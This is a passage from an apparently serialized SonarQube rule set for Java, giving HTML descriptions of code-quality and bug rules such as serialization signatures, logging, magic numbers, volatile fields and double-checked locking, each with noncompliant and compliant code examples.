      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>expm1</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>log</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>log10</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>sin</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>sinh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>sqrt</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>tan</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>tanh</td>
      <td>0.0</td>
    </tr>
    <tr>
      <td>toDegrees</td>
      <td>0.0 or 1.0</td>
    </tr>
    <tr>
      <td>toRadians</td>
      <td>0.0</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
public void doMath(int a) {
  double floor = Math.floor((double)a); // Noncompliant
  double ceiling = Math.ceil(4.2);  // Noncompliant
  double arcTan = Math.atan(0.0);  // Noncompliant
}
</pre>Z
CODE_SMELL
¬

java:S2061≥
javaS2061?Custom serialization method signatures should meet requirements"MAJOR*java:–<p>Writers of <code>Serializable</code> classes can choose to let Java's automatic mechanisms handle serialization and deserialization, or they can
choose to handle it themselves by implementing specific methods. However, if the signatures of those methods are not exactly what is expected, they
will be ignored and the default serialization mechanisms will kick back in. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Watermelon implements Serializable {
  // ...
  void writeObject(java.io.ObjectOutputStream out)// Noncompliant; not private
        throws IOException
  {...}

  private void readObject(java.io.ObjectInputStream in)
  {...}

  public void readObjectNoData()  // Noncompliant; not private
  {...}

  static Object readResolve() throws ObjectStreamException  // Noncompliant; this method may have any access modifier, may not be static

  Watermelon writeReplace() throws ObjectStreamException // Noncompliant; this method may have any access modifier, but must return Object
  {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Watermelon implements Serializable {
  // ...
  private void writeObject(java.io.ObjectOutputStream out)
        throws IOException
  {...}

  private void readObject(java.io.ObjectInputStream in)
        throws IOException, ClassNotFoundException
  {...}

  private void readObjectNoData()
        throws ObjectStreamException
  {...}

  protected Object readResolve() throws ObjectStreamException
  {...}

  private Object writeReplace() throws ObjectStreamException
  {...}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/4gAMAg">CERT, SER01-J.</a> - Do not deviate from the proper signatures of serialization
  methods </li>
</ul>ZBUG
≠

java:S3030û
javaS30301Classes should not have too many "static" imports"MAJOR*java:¬<p>Importing a class statically allows you to use its <code>public static</code> members without qualifying them with the class name. That can be
handy, but if you import too many classes statically, your code can become confusing and difficult to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value: 4</p>
<pre>
import static java.lang.Math.*;
import static java.util.Collections.*;
import static com.myco.corporate.Constants.*;
import static com.myco.division.Constants.*;
import static com.myco.department.Constants.*;  // Noncompliant
</pre>Z
CODE_SMELL
›
	java:S104œ
javaS104,Files should not have too many lines of code"MAJOR*java:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
˘
	java:S106Î
javaS106<Standard outputs should not be used directly to log anything"MAJOR*java:Ö<p>When logging a message there are several important requirements which must be fulfilled:</p>
<ul>
  <li> The user must be able to easily retrieve the logs </li>
  <li> The format of all logged message must be uniform to allow the user to easily read the log </li>
  <li> Logged data must actually be recorded </li>
  <li> Sensitive data must only be logged securely </li>
</ul>
<p>If a program directly writes to the standard outputs, there is absolutely no way to comply with those requirements. That's why defining and using a
dedicated logger is highly recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.out.println("My Message");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log("My Message");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RoElAQ">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>Z
CODE_SMELL
”
	java:S107≈
javaS107+Methods should not have too many parameters"MAJOR*java:<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, String param4, long param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, String param4) {
...
}
</pre>
<h2>Exceptions</h2>
<p>Methods annotated with Spring's <code>@RequestMapping</code> (and related shortcut annotations, like <code>@GetRequest</code>) or
<code>@JsonCreator</code> may have a lot of parameters, encapsulation being possible. Such methods are therefore ignored.</p>Z
CODE_SMELL
Ø

java:S2060†
javaS2060>"Externalizable" classes should have no-arguments constructors"MAJOR*java:æ<p>An <code>Externalizable</code> class is one which handles its own <code>Serialization</code> and deserialization. During deserialization, the first
step in the process is a default instantiation using the class' no-argument constructor. Therefore an <code>Externalizable</code> class without a
no-arg constructor cannot be deserialized.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Tomato implements Externalizable {  // Noncompliant; no no-arg constructor

  public Tomato (String color, int weight) { ... }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Tomato implements Externalizable {

  public Tomato() { ... }
  public Tomato (String color, int weight) { ... }
}
</pre>ZBUG
Ü
	java:S108¯
javaS108.Nested blocks of code should not be left empty"MAJOR*java:†<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i &lt; 42; i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty unless it is a <code>synchronized</code> block. <code>synchronized</code>
blocks are still considered empty even with comments because they can still affect program flow.</p>Z
CODE_SMELL
 
	java:S109º
javaS109 Magic numbers should not be used"MAJOR*java:Ú<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loop, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void doSomething() {
	for(int i = 0; i &lt; 4; i++){                 // Noncompliant, 4 is a magic number
		...
	}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static final int NUMBER_OF_CYCLES = 4;
public static void doSomething() {
  for(int i = 0; i &lt; NUMBER_OF_CYCLES ; i++){
    ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>hashCode</code> methods.</p>Z
CODE_SMELL
“
	java:S122ƒ
javaS122&Statements should be on separate lines"MAJOR*java:Ù<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>Z
CODE_SMELL
ö	

java:S3042ã	
javaS3042C"writeObject" should not be the only "synchronized" code in a class"MAJOR*java:ù<p>The purpose of synchronization is to ensure that only one thread executes a given block of code at a time. There's no real problem with marking
<code>writeObject</code> <code>synchronized</code>, but it's highly suspicious if this serialization-related method is the only
<code>synchronized</code> code in a <code>class</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class RubberBall {

  private Color color;
  private int diameter;

  public RubberBall(Color color, int diameter) {
    // ...
  }

  public void bounce(float angle, float velocity) {
    // ...
  }

  private synchronized void writeObject(ObjectOutputStream stream) throws IOException { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class RubberBall {

  private Color color;
  private int diameter;

   public RubberBall(Color color, int diameter) {
    // ...
  }

  public void bounce(float angle, float velocity) {
    // ...
  }

  private void writeObject(ObjectOutputStream stream) throws IOException {
    // ...
  }
}
</pre>Z
CODE_SMELL
Õ

java:S4011æ
javaS4011%Track uses of disallowed constructors"MAJOR*java:Ï<p>This rule allows banning usage of certain constructors.</p>
<h2>Noncompliant Code Example</h2>
<p>Given parameters:</p>
<ul>
  <li> className: java.util.Date </li>
  <li> argumentTypes: java.lang.String </li>
</ul>
<pre>
Date birthday;
birthday = new Date("Sat Sep 27 05:42:21 EDT 1986");  // Noncompliant
birthday = new Date(528176541000L); // Compliant
</pre>@Z
CODE_SMELL
æ

java:S2047Ø
javaS2047OThe names of methods with boolean return values should start with "is" or "has""MAJOR*java:µ<p>Well-named functions can allow the users of your code to understand at a glance what to expect from the function - even before reading the
documentation. Toward that end, methods returning a boolean should have names that start with "is" or "has" rather than with "get".</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean getFoo() { // Noncompliant
  // ...
}

public boolean getBar(Bar c) { // Noncompliant
  // ...
}

public boolean testForBar(Bar c) { // Compliant - The method does not start by 'get'.
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean isFoo() {
  // ...
}

public boolean hasBar(Bar c) {
  // ...
}

public boolean testForBar(Bar c) {
  // ...
}
</pre>
<h2>Exceptions</h2>
<p>Overriding methods are excluded.</p>
<pre>
@Override
public boolean getFoo(){
  // ...
}
</pre>Z
CODE_SMELL
Ω	

java:S2166Æ	
javaS2166FClasses named like "Exception" should extend "Exception" or a subclass"MAJOR*java:Ω<p>Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code.
Using "exception" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation
that a class' name will indicate what it is and/or does.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitException {  // Noncompliant; this has nothing to do with Exception
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException {  // Noncompliant; the extends clause was forgotten?
  public CarException(String message, Throwable cause) {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitSport {
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException extends Exception {
  public CarException(String message, Throwable cause) {
  // ...
</pre>Z
CODE_SMELL
°

java:S4348í
javaS4348#"iterator" should not return "this""MAJOR*java:À<p>There are two classes in the Java standard library that deal with iterations: <code>Iterable&lt;T&gt;</code> and <code>Iterator&lt;T&gt;</code>. An
<code>Iterable&lt;T&gt;</code> represents a data structure that can be the target of the "for-each loop" statement, and an
<code>Iterator&lt;T&gt;</code> represents the state of an ongoing traversal. An <code>Iterable&lt;T&gt;</code> is generally expected to support
multiple traversals.</p>
<p>An <code>Iterator&lt;T&gt;</code> that also implements <code>Iterable&lt;t&gt;</code> by returning itself as its <code>iterator()</code> will not
support multiple traversals since its state will be carried over.</p>
<p>This rule raises an issue when the <code>iterator()</code> method of a class implementing both <code>Iterable&lt;T&gt;</code> and
<code>Iterator&lt;t&gt;</code> returns <code>this</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class FooIterator implements Iterator&lt;Foo&gt;, Iterable&lt;Foo&gt; {
  private Foo[] seq;
  private int idx = 0;

  public boolean hasNext() {
    return idx &lt; seq.length;
  }

  public Foo next() {
    return seq[idx++];
  }

  public Iterator&lt;Foo&gt; iterator() {
    return this; // Noncompliant
  }
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class FooSequence implements Iterable&lt;Foo&gt; {
  private Foo[] seq;

  public Iterator&lt;Foo&gt; iterator() {
    return new Iterator&lt;Foo&gt;() {
      private int idx = 0;

      public boolean hasNext() {
        return idx &lt; seq.length;
      }

      public Foo next() {
        return seq[idx++];
      }
    };
  }
  // ...
}
</pre>ZBUG
à

java:S1194˘
javaS1194("java.lang.Error" should not be extended"MAJOR*java:¶<p><code>java.lang.Error</code> and its subclasses represent abnormal conditions, such as <code>OutOfMemoryError</code>, which should only be
encountered by the Java Virtual Machine.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyException extends Error { /* ... */ }       // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException extends Exception { /* ... */ }   // Compliant
</pre>Z
CODE_SMELL
’

java:S3010∆
javaS30103Static fields should not be updated in constructors"MAJOR*java:Ë<p>Assigning a value to a <code>static</code> field in a constructor could cause unreliable behavior at runtime since it will change the value for all
instances of the class.</p>
<p>Instead remove the field's <code>static</code> modifier, or initialize it statically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person {
  static Date dateOfBirth;
  static int expectedFingers;

  public Person(date birthday) {
    dateOfBirth = birthday;  // Noncompliant; now everyone has this birthday
    expectedFingers = 10;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person {
  Date dateOfBirth;
  static int expectedFingers = 10;

  public Person(date birthday) {
    dateOfBirth = birthday;
  }
}
</pre>Z
CODE_SMELL
Ï

java:S1193›
javaS1193GException types should not be tested using "instanceof" in catch blocks"MAJOR*java:Î<p>Multiple catch blocks of the appropriate type should be used instead of catching a general exception, and then testing on the type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  if(e instanceof IOException) { /* ... */ }         // Noncompliant
  if(e instanceof NullPointerException{ /* ... */ }  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (IOException e) { /* ... */ }                // Compliant
} catch (NullPointerException e) { /* ... */ }       // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/5gFFB">CERT, ERR51-J.</a> - Prefer user-defined exceptions over more general exception
  types </li>
</ul>Z
CODE_SMELL
¡

java:S1191≤
javaS11910Classes from "sun.*" packages should not be used"MAJOR*java:◊<p>Classes in the <code>sun.*</code> or <code>com.sun.*</code> packages are considered implementation details, and are not part of the Java API.</p>
<p>They can cause problems when moving to new versions of Java because there is no backwards compatibility guarantee. Similarly, they can cause
problems when moving to a different Java vendor, such as OpenJDK.</p>
<p>Such classes are almost always wrapped by Java API classes that should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import com.sun.jna.Native;     // Noncompliant
import sun.misc.BASE64Encoder; // Noncompliant
</pre>Z
CODE_SMELL
ü

java:S3027ê
javaS3027=String function use should be optimized for single characters"MAJOR*java:®<p>An <code>indexOf</code> or <code>lastIndexOf</code> call with a single letter <code>String</code> can be made more performant by switching to a
call with a <code>char</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myStr = "Hello World";
// ...
int pos = myStr.indexOf("W");  // Noncompliant
// ...
int otherPos = myStr.lastIndexOf("r"); // Noncompliant
// ...
</pre>
<h2>Compliant Solution</h2>
<pre>
String myStr = "Hello World";
// ...
int pos = myStr.indexOf('W');
// ...
int otherPos = myStr.lastIndexOf('r');
// ...
</pre>Z
CODE_SMELL
≠

java:S2177û
javaS2177FChild class methods named for parent class methods should be overrides"MAJOR*java:¥<p>When a method in a child class has the same signature as a method in a parent class, it is assumed to be an override. However, that's not the case
when:</p>
<ul>
  <li> the parent class method is <code>static</code> and the child class method is not. </li>
  <li> the arguments or return types of the child method are in different packages than those of the parent method. </li>
  <li> the parent class method is <code>private</code>. </li>
</ul>
<p>Typically, these things are done unintentionally; the private parent class method is overlooked, the <code>static</code> keyword in the parent
declaration is overlooked, or the wrong class is imported in the child. But if the intent is truly for the child class method to be different, then
the method should be renamed to prevent confusion. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Parent.java
import computer.Pear;
public class Parent {

  public void doSomething(Pear p) {
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}

// Child.java
import fruit.Pear;
public class Child extends Parent {

  public void doSomething(Pear p) {  // Noncompliant; this is not an override
    // ...
  }


  public void doSomethingElse() {  // Noncompliant; parent method is static
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
// Parent.java
import computer.Pear;
public class Parent {

  public void doSomething(Pear p) {
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}

// Child.java
import computer.Pear;  // import corrected
public class Child extends Parent {

  public void doSomething(Pear p) {  // true override (see import)
    //,,,
  }

  public static void doSomethingElse() {
    //...
  }
}
</pre>ZBUG
Õ

java:S2175æ
javaS21753Inappropriate "Collection" calls should not be made"MAJOR*java:Á<p>The <code>java.util.Collection</code> API has methods that accept <code>Object</code> parameters such as <code>Collection.remove(Object o)</code>,
and <code>Collection.contains(Object o)</code>. When the actual type of the object provided to these methods is not consistent with the type declared
on the <code>Collection</code> instantiation, those methods will always return <code>false</code> or <code>null</code>. This is most likely unintended
and hides a design problem.</p>
<p>This rule raises an issue when the type of the argument of the following APIs is unrelated to the type used for the <code>Collection</code>
declaration:</p>
<p>- <code>Collection.remove(Object o)</code></p>
<p>- <code>Collection.contains(Object o)</code></p>
<p>- <code>List.indexOf(Object o)</code></p>
<p>- <code>List.lastIndexOf(Object o)</code></p>
<p>- <code>Map.containsKey(Object key)</code></p>
<p>- <code>Map.containsValue(Object value)</code></p>
<p>- <code>Map.get(Object key)</code></p>
<p>- <code>Map.getOrDefault(Object key, V defaultValue)</code></p>
<p>- <code>Map.remove(Object key)</code></p>
<p>- <code>Map.remove(Object key, Object value)</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
public class S2175 {

  public static void main(String[] args) {
    String foo = "42";
    Map&lt;Integer, Object&gt; map = new HashMap&lt;&gt;();
    map.remove(foo); // Noncompliant; will return 'null' for sure because 'map' is handling only Integer keys

    // ...

    List&lt;String&gt; list = new ArrayList&lt;String&gt;();
    Integer integer = Integer.valueOf(1);
    if (list.contains(integer)) { // Noncompliant; always false.
      list.remove(integer); // Noncompliant; list.add(integer) doesn't compile, so this will always return 'false'
    }
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QwFlAQ">CERT, EXP04-J.</a> - Do not pass arguments to certain Java Collections
  Framework methods that are a different type than the collection parameter type </li>
</ul>ZBUG
∑	

java:S4351®	
javaS4351$"compareTo" should not be overloaded"MAJOR*java:‡<p>When implementing the <code>Comparable&lt;T&gt;.compareTo</code> method, the parameter's type has to match the type used in the
<code>Comparable</code> declaration. When a different type is used this creates an overload instead of an override, which is unlikely to be the
intent.</p>
<p>This rule raises an issue when the parameter of the <code>compareTo</code> method of a class implementing <code>Comparable&lt;T&gt;</code> is not
same as the one used in the <code>Comparable</code> declaration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  static class Bar implements Comparable&lt;Bar&gt; {
    public int compareTo(Bar rhs) {
      return -1;
    }
  }

  static class FooBar extends Bar {
    public int compareTo(FooBar rhs) {  // Noncompliant: Parameter should be of type Bar
      return 0;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
  static class Bar implements Comparable&lt;Bar&gt; {
    public int compareTo(Bar rhs) {
      return -1;
    }
  }

  static class FooBar extends Bar {
    public int compareTo(Bar rhs) {
      return 0;
    }
  }
}
</pre>ZBUG
ﬁ

java:S4288œ
javaS42882Spring components should use constructor injection"MAJOR*java:Ú<p>Spring <code>@Controller</code>, <code>@Service</code>, and <code>@Repository</code> classes are singletons by default, meaning only one instance
of the class is ever instantiated in the application. Typically such a class might have a few <code>static</code> members, such as a logger, but all
non-static members should be managed by Spring and supplied via constructor injection rather than by field injection.</p>
<p>This rule raise an issue when any non-<code>static</code> member of a Spring component has an injection annotation, or if the constructor of Spring
component does not have injection annotation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Controller
public class HelloWorld {

  @Autowired
  private String name = null; // Noncompliant

  HelloWorld() {
   // ...
  }

  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
public class HelloWorld {

  private String name = null;

  @Autowired
  HelloWorld(String name) {
    this.name = name;
   // ...
  }

  // ...
}
</pre>Z
CODE_SMELL
‹	

java:S3078Õ	
javaS3078?"volatile" variables should not be used with compound operators"MAJOR*java:Í<p>Using compound operators as well as increments and decrements (and toggling, in the case of <code>boolean</code>s) on primitive fields are not
atomic operations. That is, they don't happen in a single step. For instance, when a <code>volatile</code> primitive field is incremented or
decremented you run the risk of data loss if threads interleave in the steps of the update. Instead, use a guaranteed-atomic class such as
<code>AtomicInteger</code>, or synchronize the access.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int count = 0;
private volatile boolean boo = false;

public void incrementCount() {
  count++;  // Noncompliant
}

public void toggleBoo(){
  boo = !boo;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicInteger count = 0;
private boolean boo = false;

public void incrementCount() {
  count.incrementAndGet();
}

public synchronized void toggleBoo() {
  boo = !boo;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RIFJAg">CERT, VNA02-J.</a> - Ensure that compound operations on shared variables are
  atomic </li>
</ul>ZBUG
ä

java:S4165˚
javaS4165#Assignments should not be redundant"MAJOR*java:≠<p>The transitive property says that if <code>a == b</code> and <code>b == c</code>, then <code>a == c</code>. In such cases, there's no point in
assigning <code>a</code> to <code>c</code> or vice versa because they're already equivalent. </p>
<p>This rule raises an issue when an assignment is useless because the assigned-to variable already holds the value on all execution paths.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = b;
c = a;
b = c; // Noncompliant: c and b are already the same
</pre>
<h2>Compliant Solution</h2>
<pre>
a = b;
c = a;
</pre>Z
CODE_SMELL
Ü

java:S4042˜
javaS4042+"java.nio.Files#delete" should be preferred"MAJOR*java:°<p>When <code>java.io.File#delete</code> fails, this <code>boolean</code> method simply returns <code>false</code> with no indication of the cause. On
the other hand, when <code>java.nio.Files#delete</code> fails, this <code>void</code> method returns one of a series of exception types to better
indicate the cause of the failure. And since more information is generally better in a debugging situation, <code>java.nio.Files#delete</code> is the
preferred option.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void cleanUp(Path path) {
  File file = new File(path);
  if (!file.delete()) {  // Noncompliant
    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void cleanUp(Path path) throws NoSuchFileException, DirectoryNotEmptyException, IOException{
  Files.delete(path);
}
</pre>Z
CODE_SMELL
Æ


java:S5261ü

javaS52618"else" statements should be clearly matched with an "if""MAJOR*java:º	<p>The dangling <code>else</code> problem appears when nested <code>if</code>/<code>else</code>&nbsp;statements are written without curly braces. In
this case, <code>else</code> is associated with the nearest&nbsp;<code>if</code> but that is not always obvious and sometimes the indentation can also
be misleading.</p>
<p>This rules reports <code>else</code> statements that are difficult to understand, because they are inside nested <code>if</code> statements without
curly braces.</p>
<p>Adding curly braces can generally make the code clearer (see rule <a href='/coding_rules#rule_key=squid%3AS121'>S121</a> ), and in this situation of dangling <code>else</code>, it
really clarifies the intention of the code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 if (a)
   if (b)
     d++;
 else     // Noncompliant, is the "else" associated with "if(a)" or "if (b)"? (the answer is "if(b)")
   e++;
</pre>
<h2>Compliant Solution</h2>
<pre>
 if (a) {
   if (b) {
     d++;
   }
 } else { // Compliant, there is no doubt the "else" is associated with "if(a)"
   e++;
 }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Dangling_else">https://en.wikipedia.org/wiki/Dangling_else</a> </li>
</ul>Z
CODE_SMELL
Ã

java:S4144Ω
javaS41441Methods should not have identical implementations"MAJOR*java:·<p>When two methods have the same implementation, either it was a mistake - something else was intended - or the duplication was intentional, but may
be confusing to maintainers. In the latter case, one implementation should invoke the other. Numerical and string literals are not taken into account.
</p>
<h2>Noncompliant Code Example</h2>
<pre>
private final static String CODE = "bounteous";

public String calculateCode() {
  doTheThing();
  return CODE;
}

public String getName() {  // Noncompliant
  doTheThing();
  return CODE;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private final static String CODE = "bounteous";

public String getCode() {
  doTheThing();
  return CODE;
}

public String getName() {
  return getCode();
}
</pre>
<h2>Exceptions</h2>
<p>Methods that are not accessors (getters and setters), with fewer than 2 statements are ignored.</p>Z
CODE_SMELL
®

java:S4143ô
javaS41431Map values should not be replaced unconditionally"MAJOR*java:ƒ<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely errors.</p>
<h2>Noncompliant Code Example</h2>
<pre>
letters.put("a", "Apple");
letters.put("a", "Boy");  // Noncompliant

towns[i] = "London";
towns[i] = "Chicago";  // Noncompliant
</pre>ZBUG
£

java:S4142î
javaS41422Duplicate values should not be passed as arguments"MAJOR*java:∑<p>There are valid cases for passing a variable multiple times into the same method call, but usually doing so is a mistake, and something else was
intended for one of the arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (compare(myPoint.x, myPoint.x) != 0) { // Noncompliant
&nbsp;&nbsp;//...
}

if (compare(getNextValue(), getNextValue()) != 0) { // Noncompliant
&nbsp;&nbsp;// ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (compare(myPoint.x, myPoint.y) != 0) {
&nbsp;&nbsp;//...
}

Object v1 = getNextValue();
Object v2 = getNextValue();
if (compare(v1, v2) != 0) {
&nbsp;&nbsp;// ...
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
ì

java:S3067Ñ
javaS30671"getClass" should not be used for synchronization"MAJOR*java:Ø<p><code>getClass</code> should not be used for synchronization in non-<code>final</code> classes because child classes will synchronize on a
different object than the parent or each other, allowing multiple threads into the code block at once, despite the <code>synchronized</code>
keyword.</p>
<p>Instead, hard code the name of the class on which to synchronize or make the class <code>final</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  public void doSomethingSynchronized(){
    synchronized (this.getClass()) {  // Noncompliant
      // ...
    }
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public void doSomethingSynchronized(){
    synchronized (MyClass.class) {
      // ...
    }
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/bwCaAg">CERT, LCK02-J.</a> - Do not synchronize on the class object returned by
  getClass() </li>
</ul>ZBUG
ø

java:S3064∞
javaS3064ZAssignment of lazy-initialized members should be the last step with double-checked locking"MAJOR*java:≤<p>Double-checked locking can be used for lazy initialization of <code>volatile</code> fields, but only if field assignment is the last step in the
<code>synchronized</code> block. Otherwise you run the risk of threads accessing a half-initialized object.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  private volatile List&lt;String&gt; strings;

  public List&lt;String&gt; getStrings() {
    if (strings == null) {  // check#1
      synchronized(MyClass.class) {
        if (strings == null) {
          strings = new ArrayList&lt;&gt;();  // Noncompliant
          strings.add("Hello");  //When threadA gets here, threadB can skip the synchronized block because check#1 is false
          strings.add("World");
        }
      }
    }
    return strings;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  private volatile List&lt;String&gt; strings;

  public List&lt;String&gt; getStrings() {
    if (strings == null) {  // check#1
      synchronized(MyClass.class) {
        if (strings == null) {
          List&lt;String&gt; tmpList = new ArrayList&lt;&gt;();
          tmpList.add("Hello");
          tmpList.add("World");
          strings = tmpList;
        }
      }
    }
    return strings;
  }
}

</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/IgAZAg">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom
  </li>
</ul>
<h3>See Also</h3>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS2168'>S2168</a> Double-checked locking should not be used </li>
</ul>ZBUG
ƒ

java:S3065µ
javaS3065GMin and max used in combination should not always return the same value"MAJOR*java: <p>When using <code>Math.min()</code> and <code>Math.max()</code> together for bounds checking, it's important to feed the right operands to each
method. <code>Math.min()</code> should be used with the <strong>upper</strong> end of the range being checked, and <code>Math.max()</code> should be
used with the <strong>lower</strong> end of the range. Get it backwards, and the result will always be the same end of the range.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.min(LOWER, num);  // result = 0
    return Math.max(UPPER, result);     // Noncompliant; result is now 20: even though 12 was in the range
  }
</pre>
<h2>Compliant Solution</h2>
<p>Swapping method <code>min()</code> and <code>max()</code> invocations without changing parameters.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.max(LOWER, num);  // result = 12
    return Math.min(UPPER, result);     // Compliant; result is still 12
  }
</pre>
<p>or swapping bounds <code>UPPER</code> and <code>LOWER</code> used as parameters without changing the invoked methods.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.min(UPPER, num);  // result = 12
    return Math.max(LOWER, result);     // Compliant; result is still 12
  }
</pre>ZBUG
˜	

java:S4274Ë	
javaS4274EAsserts should not be used to check the parameters of a public method"MAJOR*java:¯<p>An <code>assert</code> is inappropriate for parameter validation because assertions can be disabled at runtime in the JVM, meaning that a bad
operational setting would completely eliminate the intended checks. Further, <code>assert</code>s that fail throw <code>AssertionError</code>s, rather
than throwing some type of <code>Exception</code>. Throwing <code>Error</code>s is completely outside of the normal realm of expected
<code>catch</code>/<code>throw</code> behavior in normal programs.</p>
<p>This rule raises an issue when a <code>public</code> method uses one or more of its parameters with <code>assert</code>s.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 public void setPrice(int price) {
  assert price &gt;= 0 &amp;&amp; price &lt;= MAX_PRICE;
  // Set the price
 }
</pre>
<h2>Compliant Solution</h2>
<pre>
 public void setPrice(int price) {
